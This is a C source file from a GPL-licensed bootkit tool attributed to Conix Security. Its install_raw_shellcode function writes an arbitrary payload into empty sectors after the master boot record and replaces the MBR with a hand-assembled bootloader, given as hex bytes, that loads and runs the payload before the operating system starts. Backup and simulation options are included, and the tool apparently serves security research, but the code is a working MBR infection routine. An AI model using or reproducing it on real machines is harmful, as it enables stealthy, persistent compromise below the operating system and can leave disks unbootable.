// Copyright 2013 Conix Security, Adrien Chevalier
// adrien.chevalier@conix.fr
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.
#include "bootkit_tool.h"

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Description :
//		Installs custom payload along with MBR (loads and exec. payload at 0000:0800)
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
DWORD install_raw_shellcode(char* path, char* device_name, BOOL simulation)
{
	
	BYTE bootloader[0x3E] = {
		0x8C, 0xC8,
		0x8E, 0xD8,
		0x8E, 0xD0,
		0xBC, 0x00, 0x7C,
		// load sector(s) at 0000:0800
		0xB0, 0x01,			// sectors count		=> TO BE MODIFIED
		0xB5, 0x00,			// cylinder n°			=> TO BE MODIFIED
		0xB1, 0x02,			// sector n°			=> TO BE MODIFIED
		0xB6, 0x00,			// track n°				=> TO BE MODIFIED
		0xB2, 0x80,
		0xBB, 0x00, 0x00,
		0x8E, 0xC3,
		0xBB, 0x00, 0x08,
		0xB4, 0x02,
		0xCD, 0x13,
		// load saved MBR sector at 0000:0600
		0xB0, 0x01,			// sectors count
		0xB5, 0x00,			// cylinder n°			=> TO BE MODIFIED
		0xB1, 0x02,			// sector n°			=> TO BE MODIFIED
		0xB6, 0x00,			// track n°				=> TO BE MODIFIED
		0xB2, 0x80,
		0xBB, 0x00, 0x00,
		0x8E, 0xC3,
		0xBB, 0x00, 0x06,
		0xB4, 0x02,
		0xCD, 0x13,
		// jmp 0000:0800
		0xBB, 0x00, 0x00,
		0x53,
		0xBB, 0x00, 0x08,
		0x53,
		0xCB
	};
	PBYTE shellcode;
	LARGE_INTEGER fileSize;
	HANDLE hPD, hSaved;
	PBYTE originalMbr, bufftemp;
	DWORD len;
	BOOL sector_empty;
	PBYTE bootloaderCode;
	DWORD nb_required_sectors;
	DWORD max_sectors_code_cave;
	DWORD code_cave_start_sector_number=0;
	DWORD cpt_sectors = 0;
	DWORD begin, size;
	DWORD i=0, j=0;
	BYTE sectorNb, trackNb, cylinderNb;

	
// sectors needed ?
	hSaved = CreateFileA(path,GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
	if(hSaved == INVALID_HANDLE_VALUE || hSaved == NULL)
	{
		printf("[!] Can't open %s\n",path);
		return -1;
	}
	if(!GetFileSizeEx(hSaved,&fileSize))
	{
		CloseHandle(hSaved);
		printf("[!] Can't open %s\n",path);
		return -1;
	}
	if(fileSize.HighPart != 0 || fileSize.LowPart > 0x2400)
	{
		CloseHandle(hSaved);
		printf("[!] Can't copy %s : file too large.\n",path);
		return -1;
	}
	nb_required_sectors = fileSize.LowPart / bytes_per_sector;
	if(fileSize.LowPart % bytes_per_sector != 0)
		nb_required_sectors++;
	shellcode = (PBYTE)malloc(nb_required_sectors*bytes_per_sector);
	memset(shellcode, 0, nb_required_sectors*bytes_per_sector);
	if(!ReadFile(hSaved,shellcode,fileSize.LowPart,&len,NULL))
	{
		CloseHandle(hSaved);
		printf("[!] Can't read %s.\n",path);
		return -1;
	}
	CloseHandle(hSaved);


// read MBR and partition table (sector #1)
	hPD = CreateFileA(device_name,GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
	if(hPD == INVALID_HANDLE_VALUE || hPD == NULL)
	{
		printf("[!] Can't open %s\n",device_name);
		return -1;
	}

	printf("[-] Reading original MBR + partition table\n");
	originalMbr=(PBYTE)malloc(bytes_per_sector);
	if(!ReadFile(hPD, originalMbr, bytes_per_sector, &len, NULL))
	{
		printf("[!] Can't read %s sector #1\n",device_name);
		free(originalMbr);
		CloseHandle(hPD);
		return -1;
	}

	max_sectors_code_cave = get_first_sector_offset_from_first_sector(originalMbr);

	if(simulation)
		printf("\t[D] Code-cave sectors end at sector 0x%d (Addr 0x%.8x)\n",max_sectors_code_cave,max_sectors_code_cave*bytes_per_sector);

// check if there are enough "code cave" sectors to copy the bootkit code + saved MBR code
	bufftemp=(PBYTE)malloc(bytes_per_sector);
	for(i = 1; i<max_sectors_code_cave; i++)
	{
		if(SetFilePointer(hPD, bytes_per_sector*i,NULL,FILE_BEGIN) != bytes_per_sector*i)
		{
			free(originalMbr);
			free(bufftemp);
			CloseHandle(hPD);
			printf("[!] Can't go to offset 0x%x\n",i*bytes_per_sector);
			return -1;
		}
		if(!ReadFile(hPD, bufftemp, bytes_per_sector, &len, NULL))
		{
			free(originalMbr);
			free(bufftemp);
			CloseHandle(hPD);
			printf("[!] Can't read offset 0x%x\n",i*bytes_per_sector);
			return -1;
		}

		sector_empty = TRUE;
		for(j=0;j<bytes_per_sector;j++)
		{
			if(bufftemp[j]!=0x0)
			{
				sector_empty = FALSE;
				break;
			}
		}

		if(sector_empty)
		{
			cpt_sectors++;
			if(code_cave_start_sector_number == 0)
				code_cave_start_sector_number = i;

			if(nb_required_sectors+1 == cpt_sectors)
				break;
		}
		else
		{
			cpt_sectors = 0;
			code_cave_start_sector_number = 0;
		}
	}
	free(bufftemp);
	CloseHandle(hPD);

	if(cpt_sectors != nb_required_sectors+1)
	{
		printf("[!] Not enough code cave sectors, aborting.\n");
		free(originalMbr);
		return -1;
	}

// identify track / cylinder / sector (no data loss, all BYTE)
	sectorNb = (code_cave_start_sector_number+1+1) % sectors_per_track;
	if(sectorNb == 0)
		sectorNb ++;
	trackNb = (code_cave_start_sector_number+1+1) / sectors_per_track;
	cylinderNb = trackNb / tracks_per_cylinder;
	trackNb = trackNb % tracks_per_cylinder;

	if(simulation)
		printf("\t[D] Found code cave at sector #%d (addr : 0x%.8x ; bootkit CTS : %d/%d/%d)\n",
			code_cave_start_sector_number+1,
			code_cave_start_sector_number*bytes_per_sector,
			cylinderNb,
			trackNb,
			sectorNb);

// Save original MBR + partition table for manual restore purpose
	hSaved = CreateFileA("1st_sector.mbr",GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
	printf("[-] Saving original MBR code to \"1st_sector.mbr\".\n");
	if(hSaved == NULL || hSaved == INVALID_HANDLE_VALUE)
	{
		free(originalMbr);
		printf("[!] Can't save the original MBR code.\n");
		return -1;
	}
	if(!WriteFile(hSaved,originalMbr,bytes_per_sector,&len,NULL))
	{
		free(originalMbr);
		CloseHandle(hSaved);
		printf("[!] Can't save the original MBR code.\n");
		return -1;
	}
	CloseHandle(hSaved);

// save information for automatic restore
	hSaved = CreateFileA("restore_point.bin",GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
	printf("[-] Saving restore information to \"restore_point.bin\".\n");
	if(hSaved == NULL || hSaved == INVALID_HANDLE_VALUE)
	{
		free(originalMbr);
		printf("[!] Can't save data.\n");
		return -1;
	}
	begin = (code_cave_start_sector_number)*bytes_per_sector;
	size = (nb_required_sectors+1)*bytes_per_sector;
	if(!WriteFile(hSaved,&begin, 4,&len,NULL))
	{
		free(originalMbr);
		CloseHandle(hSaved);
		printf("[!] Can't save data.\n");
		return -1;
	}
	if(!WriteFile(hSaved,&size, 4,&len,NULL))
	{
		free(originalMbr);
		CloseHandle(hSaved);
		printf("[!] Can't save data.\n");
		return -1;
	}
	if(!WriteFile(hSaved,originalMbr,bytes_per_sector,&len,NULL))
	{
		free(originalMbr);
		CloseHandle(hSaved);
		printf("[!] Can't save data.\n");
		return -1;
	}
	CloseHandle(hSaved);


// Copy the MBR original code on sector #code_cave_start_sector_number+1
	hPD = CreateFileA(device_name,GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
	if(hPD == NULL || hPD == INVALID_HANDLE_VALUE)
	{
		free(originalMbr);
		printf("[!] Can't open %s (write)\n",device_name);
		return -1;
	}
	
	printf("[-] Writing original MBR on sector #%d\n",code_cave_start_sector_number+1);
	if(!simulation)
	{
		if(SetFilePointer(hPD,code_cave_start_sector_number*bytes_per_sector,NULL,FILE_BEGIN) != code_cave_start_sector_number*bytes_per_sector)
		{
			free(originalMbr);
			CloseHandle(hPD);
			printf("[!] Can't go to offset 0x%x\n",code_cave_start_sector_number*bytes_per_sector);
			return -1;
		}
		if(!WriteFile(hPD,originalMbr,bytes_per_sector,&len,NULL))
		{
			free(originalMbr);
			CloseHandle(hPD);
			printf("[!] Can't write 0x%x bytes at offset 0x%x\n",bytes_per_sector,code_cave_start_sector_number*bytes_per_sector);
			return -1;
		}
	}

// write shellcode
	for(i = 0; i < nb_required_sectors; i++)
	{
		printf("[-] Writing shellcode on sector #%d\n",i+code_cave_start_sector_number+1+1);
		if(!simulation)
		{
			if(SetFilePointer(hPD,(code_cave_start_sector_number+1+i)*bytes_per_sector,NULL,FILE_BEGIN) != (code_cave_start_sector_number+1+i)*bytes_per_sector)
			{
				free(originalMbr);
				CloseHandle(hPD);
				printf("[!] Can't go to offset 0x%x\n",(code_cave_start_sector_number+1+i)*bytes_per_sector);
				return -1;
			}
			if(!WriteFile(hPD,(PVOID)((DWORD)shellcode+(i*bytes_per_sector)),bytes_per_sector,&len,NULL))
			{
				free(originalMbr);
				CloseHandle(hPD);
				printf("[!] Can't write 0x%x bytes at sector #%d. You SHOULD restore old MBR...\n",bytes_per_sector,i+code_cave_start_sector_number+1);
				return -1;
			}
		}
	}
	

// generate bootloader code
	bootloaderCode = (PBYTE)malloc(bytes_per_sector);
	memset(bootloaderCode, 0, bytes_per_sector);
	memcpy(bootloaderCode, bootloader, CUSTOM_BOOTLOADER_SIZE);
	// "startup" code
	bootloaderCode[0x0a] = (BYTE)nb_required_sectors;
	bootloaderCode[0x0c] = cylinderNb;
	bootloaderCode[0x10] = trackNb;
	bootloaderCode[0x0e] = sectorNb;
	// original mbr load code
	bootloaderCode[0x22] = cylinderNb;
	bootloaderCode[0x26] = trackNb;
	bootloaderCode[0x24] = sectorNb-1;
	// system ID + partition table + magic number
	memcpy((PVOID)((DWORD)bootloaderCode+0x1b8),(PVOID)((DWORD)originalMbr+0x1b8),0x48);

// write bootloader on sector #1
	printf("[-] Writing bootloader on sector #1\n");
	if(!simulation)
	{
		if(SetFilePointer(hPD,0,NULL,FILE_BEGIN) != 0)
		{
			free(bootloaderCode);
			free(originalMbr);
			CloseHandle(hPD);
			printf("[!] Can't go to offset 0x0\n");
			return -1;
		}
		if(!WriteFile(hPD,bootloaderCode,bytes_per_sector,&len,NULL))
		{
			free(bootloaderCode);
			free(originalMbr);
			CloseHandle(hPD);
			printf("[!] Can't write 0x%x bytes at offset 0x0\n",bytes_per_sector);
			return -1;
		}
	}
	else
	{
		printf(  "\n\t\t[== BOOTLOADER CODE ==]\n");
		for(i=0; i<bytes_per_sector; i++)
		{
			if(i % 0x10 == 0)
				printf("\n%.8x\t",i+0x7c00);
			
			printf("%.2x ",bootloaderCode[i]);
		}
		printf("\n\n\t\t[=====================]\n\n");
	}

	printf("[-] Finished\n");
	free(bootloaderCode);
	free(originalMbr);
	CloseHandle(hPD);
	return 0;

}
